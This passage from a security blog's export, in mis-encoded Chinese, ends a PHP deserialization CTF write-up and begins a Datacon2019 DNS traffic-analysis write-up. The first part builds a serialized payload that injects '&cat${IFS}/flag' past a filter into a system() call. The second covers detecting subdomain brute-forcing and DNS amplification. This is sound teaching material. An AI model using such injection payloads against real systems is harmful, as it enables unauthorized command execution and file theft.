<p><code>call_user_func_array()</code>å†…ç½®æ–¹æ³•çš„ä½œç”¨æ˜¯è°ƒç”¨ä¸€ä¸ªæŒ‡å®šæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¦è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºç»™è°ƒç”¨çš„å‡½æ•°ä¼ å‚ã€‚ä½†æ˜¯è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨ä¸€ä¸ªæ•°ç»„<code>array($this, $this-&gt;method)</code>æ¥è¡¨ç¤ºï¼Œæ„æ€å°±æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºæ˜¯è¯¥æ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œç¬¬äºŒä¸ªå…ƒç´ å°±æ˜¯æ–¹æ³•åã€‚è€Œä¸”ifè¯­å¥å·²ç»é™å®šäº†<code>method</code>å‚æ•°å¿…é¡»æ˜¯<code>echos</code>ã€‚å†æ¥çœ‹çœ‹<code>echos</code>è¿™ä¸ªç±»æ–¹æ³•ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params">$host</span>)</span>&#123;</span><br><span class="line">   system(<span class="string">&quot;echos <span class="subst">$host</span>&quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>system()</code>å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸”<code>host</code>å‚æ•°å¯æ§ï¼Œäºæ˜¯åˆ¤æ–­è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚äºæ˜¯æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
<li>
<p>é€šè¿‡ååºåˆ—åŒ–æ§åˆ¶methodå’Œargsä¸¤ä¸ªæˆå‘˜å˜é‡</p>
</li>
<li>
<p>methodå¿…é¡»æ˜¯echosä¸ç„¶é€šä¸è¿‡ifåˆ¤æ–­</p>
</li>
<li>
<p>é€šè¿‡call_user_func_array()å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°è°ƒç”¨æœ¬ç±»ä¸­çš„echosæ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°ç»™æ–¹æ³•ä¼ å‚-</p>
</li>
<li>
<p>ç”±äºechosæ–¹æ³•ä¸­çš„systemå‡½æ•°çš„å‚æ•°æ˜¯æ‹¼æ¥å½¢å‚çš„ï¼Œå®Œæˆå‘½ä»¤æ³¨å…¥ã€‚</p>
</li>
</ol>
<p>æ ¹æ®é¡ºåºï¼Œå…ˆæ‰§è¡Œ<code>__wakeup</code>å†æ‰§è¡Œ<code>__destruct</code>ï¼Œ<code>__wakeup</code>ä¸­å¯¹å‚æ•°æœ‰ä¸€ä¸ªè¿‡æ»¤çš„å¤„ç†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">   $str=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">   $str=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°å®ƒé»˜è®¤å°†<code>args</code>å˜é‡è§†ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¯¹å…¶è¿›è¡Œäº†<code>foreach</code>ï¼Œç„¶ååˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ é€å»äº†wafè¿›è¡Œè¿‡æ»¤ã€‚è¿™è¡¨æ˜æˆ‘ä»¬ä¼ å…¥çš„<code>args</code>æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚å¹¶ä¸”<code>args</code>ä¸­ä¸å…è®¸å‡ºç°<code>[&lt;&gt;*;|?\n ]</code>è¿™äº›å­—ç¬¦ï¼Œä»¥åŠ<code>flag</code>å…³é”®è¯ã€‚</p>
<p>å¹¶ä¸”<code>echos</code>æ˜¯ä¸€ä¸ªé”™è¯¯çš„å‘½ä»¤ï¼Œæ‰€ä»¥ç»¼åˆä»¥ä¸Šä¸¤ç‚¹ï¼Œå¿…é¡»ä½¿ç”¨<code>&amp;</code>å‘½ä»¤è¿æ¥ç¬¦ã€‚</p>
<p>æ„é€ ååºåˆ—åŒ–ç±»ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method = <span class="string">&#x27;echos&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $args = <span class="keyword">array</span>(<span class="string">&#x27;&amp;cat$&#123;IFS&#125;/flag)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> come());</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:5:&quot;echos&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;i:0;s:16:&quot;&amp;cat$&#123;IFS&#125;&#x2F;flag)&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å¦‚æœPHPç‰ˆæœ¬å¤§äº7.0ï¼Œå¯ä»¥ç›´æ¥æŠŠprivateå±æ€§æ”¹æˆpublic</p>
</blockquote>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£PHPååºåˆ—åŒ–æ¼æ´</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&amp;mid=2247485916&amp;idx=1&amp;sn=ce338562a75b529b26d484fa90de031c&amp;chksm=fe12fb41c96572572618a816ca615d562d5a4965990122c40e82a1b8f9084bc0a9438286a37c&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1585963011738&amp;sharer_shareid=247225a71986860a67a64293d2159472#rd">phpååºåˆ—åŒ–é‚£äº›äº‹</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v1</title>
    <url>/Web_security/ctf_writeup/1.Datacon2019-q1-Writeup-v1/</url>
    <content><![CDATA[<h1 id="Datacon2019-q1-Writeup-v1">Datacon2019-q1-Writeup-v1</h1>
<p>è¿™æ˜¯æˆ‘å†™çš„ç¬¬ä¸€ç¯‡åšæ–‡ã€‚</p>
<p>è¿‡å‡ ä¸ªæœˆå°±è¦å»è¯»ç ”äº†ï¼Œæš‘å‡æœŸé—´å¯¼å¸ˆç»™äº†æˆ‘ä»¬ä¸€ä¸ªå°å°çš„ä»»åŠ¡ï¼šå¤ç°2019 Dataconæ¯”èµ›çš„ç¬¬ä¸€é¢˜ã€‚ä¹‹å‰ä»æ¥æ²¡æœ‰æ¥è§¦è¿‡æµé‡åˆ†æç›¸å…³çš„å·¥ä½œï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªå…¨æ–°çš„å¼€å§‹ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹åˆ«äººçš„æ€è·¯å’Œå¤ç°çš„è¿‡ç¨‹ã€‚</p>
<h2 id="é¢˜ç›®è¯´æ˜">é¢˜ç›®è¯´æ˜</h2>
<h3 id="é¢˜ç›®èƒŒæ™¯">é¢˜ç›®èƒŒæ™¯</h3>
<p>å‡å¦‚ä½ æ˜¯æŸç½‘ç»œçš„ç®¡ç†å‘˜ï¼Œè¿‘æ—¥æ¥åˆ°å‘Šè­¦ç§°ï¼Œç½‘ç»œä¸­å­˜åœ¨ DNS æ”»å‡»è¡Œä¸ºï¼Œå¸Œæœ›ä½ è¿›è¡Œè°ƒæŸ¥ã€‚ç°æ•è·åˆ°ç½‘ç»œä¸­çš„ DNS æµé‡ï¼Œè¯·å¯¹å…¶ä¸­çš„æ”»å‡»è¡Œä¸ºè¿›è¡Œåˆ†æã€‚</p>
<h3 id="é¢˜ç›®è¦ç‚¹">é¢˜ç›®è¦ç‚¹</h3>
<p>DNSæ˜¯äº’è”ç½‘ä¸­é‡è¦çš„åŸºç¡€è®¾æ–½ä¹‹ä¸€ï¼Œå¯¹ç½‘ç»œçš„ç¨³å®šè¿è¡Œæœ‰è‡³å…³é‡è¦çš„ä½œç”¨ã€‚ç„¶è€Œï¼Œç”±äºè®¾è®¡ç¼ºé™·ï¼ŒDNS å­˜åœ¨è¯¸å¤šè„†å¼±ç‚¹ï¼Œå› æ­¤å¯è¢«åˆ©ç”¨ä¸è¯¸å¤šæ”»å‡»ã€‚æœ¬é¢˜å¯¹å¸¸è§çš„ DNS å®‰å…¨é—®é¢˜è¿›è¡Œè€ƒå¯Ÿã€‚</p>
<h2 id="çŸ¥è¯†å‚¨å¤‡">çŸ¥è¯†å‚¨å¤‡</h2>
<h3 id="DNSåè®®åŠæŠ¥æ–‡æ ¼å¼">DNSåè®®åŠæŠ¥æ–‡æ ¼å¼</h3>
<p>è¿™ç¯‡<a href="https://jocent.me/2017/06/18/dns-protocol-principle.html#_label2">æ–‡ç« </a>å¯¹äºDNSè®²çš„è¿˜æ¯”è¾ƒé€å½»ï¼Œåœ¨æ­¤åŸºç¡€åšä¸€ç‚¹æ‘˜è¦ã€‚</p>
<ul>
<li>
<p>åŸŸåå±‚æ¬¡ç»“æ„<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4r8j4pn8xj20tm0ar74y.jpg" alt="åŸŸåå±‚æ¬¡"></p>
</li>
<li>
<p>åŸŸåæœåŠ¡å™¨<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4r8nxtahtj20qt09zaap.jpg" alt="åŸŸåæœåŠ¡å™¨"><br>
å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚é¦–å…ˆå°±æ˜¯å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨çš„ã€‚</p>
</li>
<li>
<p>åŸŸåè§£æè¿‡ç¨‹</p>
<p>ä»¥æŸ¥è¯¢<code>jocent.me</code>ä¸ºä¾‹ï¼Œå…¶ä¸­10.74.36.90ä¸ºä¸»æœºIPï¼Œ10.74.1.11ä¸ºæœ¬åœ°DNSæœåŠ¡å™¨ï¼š<br/><br>
â‘ ä¸»æœº10.74.36.90å…ˆå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨10.74.1.11è¿›è¡Œé€’å½’æŸ¥è¯¢<br/><br>
â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é‡‡ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œå‘ä¸€ä¸ªæ ¹åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢<br/><br>
â‘¢æ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ¬¡åº”è¯¥æŸ¥è¯¢çš„é¡¶çº§åŸŸåæœåŠ¡å™¨<code>dns.me</code>çš„IPåœ°å€<br/><br>
â‘£æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘é¡¶çº§åŸŸåæœåŠ¡å™¨<code>dns.me</code>è¿›è¡ŒæŸ¥è¯¢<br/><br>
â‘¤é¡¶çº§åŸŸåæœåŠ¡å™¨meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥æŸ¥è¯¢æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>çš„IPåœ°å€<br/><br>
â‘¥æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>è¿›è¡ŒæŸ¥è¯¢<br/><br>
â‘¦æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰€æŸ¥è¯¢çš„ä¸»æœºçš„IPåœ°å€<br/><br>
â‘§æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€åæŠŠæŸ¥è¯¢ç»“æœå‘Šè¯‰ 10.74.36.90<br/><br>
å…¶ä¸­æœ‰ä¸¤ä¸ªæ¦‚å¿µé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢:<br>
<strong>é€’å½’æŸ¥è¯¢</strong>ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚<br/><br>
<strong>è¿­ä»£æŸ¥è¯¢</strong>ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚</p>
</li>
<li>
<p>æŠ¥æ–‡æ ¼å¼<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4r98y58kmj20ob0bc3z6.jpg" alt="DNSåè®®æŠ¥æ–‡æ ¼å¼"></p>
</li>
</ul>
<h3 id="a-id-ANY-DNSèµ„æºè®°å½•ANYç±»å‹"><a id='ANY'> <strong>DNSèµ„æºè®°å½•ANYç±»å‹</strong></h3>
<p>ä¸ºä»€ä¹ˆåœ¨DDOSæ–¹æ³•æ”»å‡»çš„æ—¶å€™éœ€è¦æŒ‡å®šANYç±»å‹å‚æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨digå‘½ä»¤æ¥çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µï¼š<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4sps2a7apj20tm0i1q8t.jpg" alt=""><br>
å¯ä»¥çœ‹åˆ°ï¼ŒDNSæœåŠ¡å™¨è¿”å›äº†è¯¥æœåŠ¡å™¨ä¸­æ‰€æœ‰å…³äº<code>163.com</code>çš„èµ„æºè®°å½•ï¼ŒåŒ…æ‹¬ç±»å‹Aï¼ŒNSï¼ŒMXï¼ŒTXTï¼Œè¿™æ ·å°±ä½¿å¾—å“åº”æ•°æ®åŒ…è¿œè¿œå¤§äºè¯·æ±‚æ•°æ®åŒ…ã€‚<br>
æˆ‘ä»¬ä¸å¦¨å†å¾€æ·±å±‚æ¬¡æƒ³ä¸€æƒ³ï¼Œå·²çŸ¥UDPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦æ˜¯512å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´å½“DNSå“åº”æ•°æ®å¤§äº512å­—èŠ‚çš„æ—¶å€™ï¼Œæ•°æ®åªè¿”å›512å­—èŠ‚ï¼Œå‰©ä½™çš„æ•°æ®å°†è¢«ä¸¢å¼ƒã€‚ä¸ºä»€ä¹ˆåœ¨è¿™ä¸ªåœ°æ–¹DNSçš„å“åº”æ•°æ®å¯ä»¥è¿”å›å¤§äº2000å­—èŠ‚çš„æ•°æ®å‘¢ï¼Ÿå¯ä»¥å»æŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­çš„Additional Recordsæœ‰ä¸€æ¡OPTç±»å‹çš„èµ„æºè®°å½•ï¼ŒOPTç±»å‹æ˜¯ä¸€ç§ä¸€ä¸ªâ€œä¼ª DNSè®°å½•ç±»å‹â€ä»¥æ”¯æŒ EDNSåè®®ï¼Œå…¶ä¸­<code>UDP Payload Size</code>å­—æ®µå¯ä»¥æŒ‡å®šDNSè¿”å›æŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ã€‚<a href="http://blog.hnxiezan.com/blog/post/1/">è¿™é‡Œ</a>å¯¹EDNSæœ‰æ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šã€‚</p>
<h3 id="DNSæ”»å‡»ç±»å‹">DNSæ”»å‡»ç±»å‹</h3>
<p><a href="https://securitytrails.com/blog/most-popular-types-dns-attacks">è¿™é‡Œ</a>æœ‰å¯¹DNSçš„å„ç§æ”»å‡»ç±»å‹çš„ä»‹ç»ã€‚</p>
<h3 id="dns-flags-optå¸¸è§çš„å€¼"><code>dns.flags.opt</code><strong>å¸¸è§çš„å€¼</strong></h3>
<ul>
<li>dns.flags.opcode=0(åªæ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</li>
<li>dns.flags.opcode=1(åªæ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</li>
<li>dns.flags.opcode=2(åªæ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯)</li>
<li>dns.flags.opcode=5(åªæ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯ï¼‰</li>
</ul>
<h3 id="DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”NSå’ŒSOA">DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”NSå’ŒSOA</h3>
<p><a href="https://www.cnblogs.com/comefuture/p/7543752.html">NSå’ŒSOAçš„åŒºåˆ«</a></p>
<p><strong>SOA</strong>ï¼Œå³Start Of Authorityï¼Œæ”¾åœ¨ zone file ä¸­ï¼Œç”¨äºæè¿°è¿™ä¸ª zone è´Ÿè´£çš„ name serverï¼Œversion numberâ€¦ç­‰èµ„æ–™ï¼Œä»¥åŠå½“ slave server è¦å¤‡ä»½è¿™ä¸ª zone æ—¶çš„ä¸€äº›å‚æ•°ã€‚æ¯ä¸ª zone file ä¸­å¿…é¡»æœ‰ä¸”ä»…æœ‰ä¸€æ¡ SOARR ï¼Œå¹¶åœ¨ zone file ä¸­ä½œä¸ºç¬¬ä¸€æ¡èµ„æºè®°å½•ä¿å­˜ã€‚</p>
<h3 id="DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”AXFRå’ŒIXFR">DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”AXFRå’ŒIXFR</h3>
<p>AXFRï¼ˆå®Œå…¨åŒºåŸŸä¼ è¾“ 252ï¼‰ï¼šç”±ä¸»åŸŸåæœåŠ¡å™¨è½¬ç§»æ•´ä¸ªåŒºåŸŸæ–‡ä»¶è‡³è¾…åŠ©åŸŸåæœåŠ¡å™¨ã€‚</p>
<p>IXFRï¼ˆå¢é‡åŒºåŸŸä¼ è¾“ 251ï¼‰ï¼šè¯·æ±‚åªæœ‰ä¸å…ˆå‰æµæ°´å¼ç¼–å·ä¸åŒçš„ç‰¹å®šåŒºåŸŸçš„åŒºåŸŸè½¬ç§»ã€‚æ­¤è¯·æ±‚æœ‰æœºä¼šè¢«æ‹’ç»ï¼Œå¦‚æœæƒå¨æœåŠ¡å™¨ç”±äºé…ç½®æˆ–ç¼ºä¹å¿…è¦çš„æ•°æ®è€Œæ— æ³•å±¥è¡Œè¯·æ±‚ï¼Œä¸€ä¸ªå®Œæ•´çš„ï¼ˆAXFRï¼‰ä¼šè¢«å‘é€ä»¥ä½œå›åº”ã€‚</p>
<p><a href="https://www.cnblogs.com/cyjaysun/p/4265240.html">è¯¦ç»†ä»‹ç»</a></p>
<h3 id="DNSSECåè®®">DNSSECåè®®</h3>
<p><a href="https://bbs.huaweicloud.com/blogs/1f0fba3f514e11e9bd5a7ca23e93a891">æµ…è°ˆDNSåŸŸåå®‰å…¨æ‰©å±•åè®®DNSSEC</a></p>
<h2 id="è§£é¢˜è¿‡ç¨‹">è§£é¢˜è¿‡ç¨‹</h2>
<h3 id="å­åŸŸåçˆ†ç ´æ”»å‡»">å­åŸŸåçˆ†ç ´æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p>é“¾æ¥](<a href="https://www.secpulse.com/archives/55823.html">https://www.secpulse.com/archives/55823.html</a>)</p>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹<br>
é¦–å…ˆï¼Œç”¨ Wireshark æ‰“å¼€ pcap åŒ…ï¼Œç»˜åˆ¶ IO Graphsï¼š<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rdg2cpa3j211g0b1jun.jpg" alt=""><br>
å¯è§ï¼Œåœ¨ 5500 - 6000s ä¸­å‡ºç°äº†å¼‚å¸¸çš„å³°å€¼æµé‡ï¼Œå°†5500såˆ°6000sæ‰€æœ‰è¯·æ±‚ã€å“åº”æå–åˆ°æ–°çš„ pcapæ–‡ä»¶ã€‚</p>
<p>æ¥ä¸‹æ¥ä½¿ç”¨ åè®®åˆ†çº§ æŸ¥çœ‹å“ªäº›åè®®å æ¯”æœ€å¤šï¼š<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rdzspy3ej20us05u0tm.jpg" alt=""><br>
å¯ä»¥çœ‹åˆ°ï¼Œåˆ‡å‡ºæ¥çš„åŒ…é‡Œé¢ä»…æœ‰DNSåè®®ï¼Œè€Œä¸”ç”¨æˆ·ä¸»åŠ¨å‘é€çš„æ•°æ®åŒ…å æ¯”æœ€å¤§ã€‚<br>
æŸ¥çœ‹åˆ†ç»„é•¿åº¦<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rer19tc2j20m7081gmo.jpg" alt=""><br/><br>
<strong>é•¿åº¦ä¸º1280~2559å­—èŠ‚çš„æ•°æ®åŒ…é€šå¸¸è¡¨ç¤ºæ•°æ®ä¼ è¾“ï¼Œé•¿åº¦è¾ƒå°çš„æ•°æ®åŒ…åˆ™è¡¨ç¤ºåè®®æ§åˆ¶åºåˆ—</strong></p>
<p>ä»¥è¯·æ±‚æ•°é‡ä»é«˜åˆ°ä½çš„ IP åœ°å€è¿›è¡Œæ’åºã€‚<br>
<strong>æ–¹æ³•ä¸€(é€Ÿåº¦å¾ˆæ…¢)ï¼š</strong><br>
ä½¿ç”¨wiresharkçš„ç»Ÿè®¡åŠŸèƒ½ï¼Œå¹¶ä¸”ç”¨<code>dns.flags.response == 0</code>è¿›è¡Œç­›é€‰(åªçœ‹DNSæŸ¥è¯¢æŠ¥æ–‡)ï¼š<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rfgmc1aoj20mb0ckmz3.jpg" alt=""><br/><br>
<strong>æ–¹æ³•äºŒï¼š</strong></p>
<p>ä½¿ç”¨tsharkå‘½ä»¤è¡Œè¿›è¡Œç­›é€‰<code>tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\t&quot; &quot;\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt</code></p>
<p>å‚æ•°è§£é‡Šï¼š</p>
<p>-r æŒ‡å®šç›®æ ‡æ–‡ä»¶</p>
<p>-Y æŒ‡å®šè¿‡æ»¤è§„åˆ™</p>
<p>-T pdml|ps|text|fields|psml,è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼ï¼ŒåŒ…æ‹¬text,ps,psmlå’Œpdmlï¼Œé»˜è®¤ä¸ºtext</p>
<p>-e  å¦‚æœ-T fieldsé€‰é¡¹æŒ‡å®šï¼Œ-eç”¨æ¥æŒ‡å®šè¾“å‡ºå“ªäº›å­—æ®µ</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rfi2f16nj20p00gsjsm.jpg" alt=""><br>
é¦–å…ˆæŸ¥çœ‹ç¬¬ä¸€ä¸ªIP 45.80.170.1ï¼š<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rlk5wk9bj211k09iaci.jpg" alt=""><br>
å¯ä»¥çœ‹åˆ°è¿™ä¸ªIPåœ°å€æ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚<br>
å†æ¥æŸ¥çœ‹ç¬¬äºŒä¸ªIP 144.202.64.226ï¼š<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rlqt02paj211i0e5n0s.jpg" alt=""><br>
144.202.64.226 å‘èµ·äº†å¤§é‡é’ˆå¯¹<code>b0e.com.cn</code>åŸŸåçš„æŸ¥è¯¢è¯·æ±‚ï¼Œä¸”å¤§éƒ¨åˆ†ç›¸åº”ç»“æœå‡ä¸º No such nameï¼Œå› æ­¤åˆ¤æ–­æ­¤ç±»æ”»å‡»ä¸ºå­åŸŸåçˆ†ç ´æ”»å‡»ã€‚<br>
é€šè¿‡è§‚å¯Ÿï¼Œå¯ä»¥å‘ç°ï¼Œå‰ 10 ä¸ªè¯·æ±‚å¹¶ä¸æ˜¯åŸŸåçˆ†ç ´æ”»å‡»ï¼Œå»æ‰è¯¥ 10 ä¸ªè¯·æ±‚åï¼Œç¬¬ä¸€ç±»æ”»å‡»å…±æœ‰ 34184 ä¸ªã€‚</p>
</li>
</ul>
<h3 id="DDOSåå°„æ”¾å¤§æ”»å‡»">DDOSåå°„æ”¾å¤§æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rm7yrtvbj20970adwek.jpg" alt=""></p>
<ul>
<li>æµé‡æ”¾å¤§ï¼šåˆ©ç”¨å›å¤åŒ…æ¯”è¯·æ±‚åŒ…å¤§çš„ç‰¹ç‚¹</li>
<li>åœ°å€ä¼ªé€ ï¼šä¼ªé€ è¯·æ±‚åŒ…çš„æºåœ°å€ä¸ºæ”»å‡»ç›®æ ‡</li>
<li>åˆ†å¸ƒå¼ï¼šå¤šä¸ª DNS åŒæ—¶å‘æ”»å‡»ç›®æ ‡è¿”å›å¤§é‡å“åº”</li>
</ul>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾</p>
<ul>
<li>é€šè¿‡é€’å½’æŸ¥è¯¢ä»è€Œæ”¾å¤§æµé‡ï¼Œå› æ­¤recursion=1ï¼ŒANYå‚æ•°ï¼ˆ<a href="#ANY">ä¸ºä»€ä¹ˆå¿…é¡»æ˜¯ANYå‚æ•°</a>ï¼‰ã€‚</li>
<li>è¦æ±‚è¿”å›åŒ…è¿œè¿œå¤§äºå‘é€åŒ…ï¼Œä¸€èˆ¬è¿”å›åŒ…çš„è¦æ±‚å¤§äº3000ã€‚å³dns.rr.udp_payload_size&gt;=3000ã€‚</li>
</ul>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹<br>
